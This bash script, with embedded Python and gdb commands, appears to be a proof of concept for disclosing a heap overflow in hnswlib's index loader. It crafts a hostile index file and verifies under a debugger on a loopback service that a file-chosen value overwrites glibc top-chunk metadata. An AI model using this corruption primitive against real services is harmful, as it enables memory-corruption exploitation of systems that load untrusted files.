#!/usr/bin/env bash
# Freeze the UNSANITIZED loopback service and prove a file-chosen 64-bit value
# reaches the real glibc top-chunk size field beside the level0 allocation.
# Requires run.sh <OUT> once first (builds service_gdb and the hostile index).
# The fixed side is an UNMERGED PR #677 head, never a released fix.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-/tmp/hnsw2-service-out}
cd "$OUT" || exit 2
OUT=$(pwd)
PORT=${2:-49734}
python3 - "$OUT" "$PORT" <<'PY' || exit 2
import struct, sys
out, port = sys.argv[1], sys.argv[2]
src = out + "/hostile-5a.bin"
data = bytearray(open(src, "rb").read())
# level0 image starts at file offset 96; dst+264 is the top chunk size field.
data[96 + 264:96 + 272] = struct.pack("<Q", 0x1122334455667788)
open(out + "/hostile-chosen.bin", "wb").write(data)
script = """set pagination off
set confirm off
set print elements 16
break {out}/v09/hnswlib/hnswalg.h:779
run {port} {out}/gdb-received-chosen.bin
set $dst = data_level0_memory_
set $before = *(unsigned long *)($dst + 264)
printf "\\n==== CHOSEN-VALUE FREEZE AT PINNED READ ====\\n"
printf "dst=%p per=%lu\\n", $dst, size_data_per_element_
printf "top chunk header BEFORE copy: "
x/2gx $dst+256
break malloc if *(unsigned long *)($dst + 264) != $before
continue
printf "\\n==== TOP CHUNK HEADER AFTER COPY ====\\n"
x/2gx $dst+256
printf "expected size field from file bytes at offset 360: 0x1122334455667788\\n"
bt 5
quit
""".format(out=out, port=port)
open(out + "/freeze-chosen.gdb", "w").write(script)
print("chosen_bytes_at_file_offset_360=" + data[360:368].hex())
PY
gdb -q -batch -x "$OUT/freeze-chosen.gdb" "$OUT/service_gdb" \
  > "$OUT/gdb-chosen.log" 2>&1 &
g=$!
sleep 1
python3 "$HERE/client.py" "$PORT" "$OUT/hostile-chosen.bin" > "$OUT/chosen-client.log" 2>&1
wait "$g"
echo "gdb_rc=$?"
cat "$OUT/chosen-client.log" "$OUT/gdb-chosen.log"
python3 - "$OUT/gdb-chosen.log" <<'PY' || exit 1
import re, sys
log = open(sys.argv[1]).read()
before = re.search(r"BEFORE copy:.*0x[0-9a-f]+:\s+0x[0-9a-f]+\s+(0x[0-9a-f]+)", log)
after = re.search(r"AFTER COPY.*?0x[0-9a-f]+:\s+0x[0-9a-f]+\s+(0x[0-9a-f]+)", log, re.S)
if not (before and after):
    raise SystemExit("chosen_freeze_missing_headers")
print("top_size_before=%s top_size_after=%s chosen_value_present=%s" % (
    before.group(1), after.group(1), after.group(1) == "0x1122334455667788"))
if before.group(1) == after.group(1) or after.group(1) != "0x1122334455667788":
    raise SystemExit("chosen_freeze_value_mismatch")
PY
echo "CHOSEN VALUE REACHED REAL HEAP METADATA rc 0"
